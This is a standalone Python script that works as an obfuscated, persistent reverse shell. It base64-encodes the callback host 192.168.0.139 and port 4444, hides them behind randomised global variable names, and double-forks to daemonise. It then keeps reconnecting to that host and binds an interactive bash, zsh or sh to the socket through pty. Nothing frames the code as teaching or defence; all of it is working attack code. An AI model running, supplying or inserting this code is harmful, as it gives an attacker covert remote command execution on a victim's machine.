#!/usr/bin/env python3
import socket
import os
import time
import random
import string
import pty
import base64

def _qwe123():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

_x9z = _qwe123()  # HOST
_p7q = _qwe123()  # PORT
_r4t = _qwe123()  # socket
_z2n = _qwe123()  # time

_obf_host = "MTkyLjE2OC4wLjEzOQ=="  # base64 of "192.168.0.139"
_obf_port = "NDQ0NA=="  # base64 of "4444"

globals()[_x9z] = base64.b64decode(_obf_host).decode()
globals()[_p7q] = int(base64.b64decode(_obf_port).decode())

# Set socket timeout to avoid hanging
socket.setdefaulttimeout(5)

def _j5v():
    while True:
        try:
            globals()[_r4t] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            globals()[_r4t].connect((globals()[_x9z], globals()[_p7q]))
            _y6h = "/bin/bash" if os.path.exists("/bin/bash") else "/bin/zsh" if os.path.exists("/bin/zsh") else "/bin/sh"
            try:
                os.dup2(globals()[_r4t].fileno(), 0)
                os.dup2(globals()[_r4t].fileno(), 1)
                os.dup2(globals()[_r4t].fileno(), 2)
                pty.spawn([_y6h, "-i"])
            except Exception as e:
                pass  # Continue retrying if shell fails
            globals()[_r4t].close()
        except:
            globals()[_z2n] = time.sleep(5)  # Reduced delay for faster reconnect

if os.fork() > 0:
    os._exit(0)
os.setsid()
if os.fork() > 0:
    os._exit(0)

_j5v()
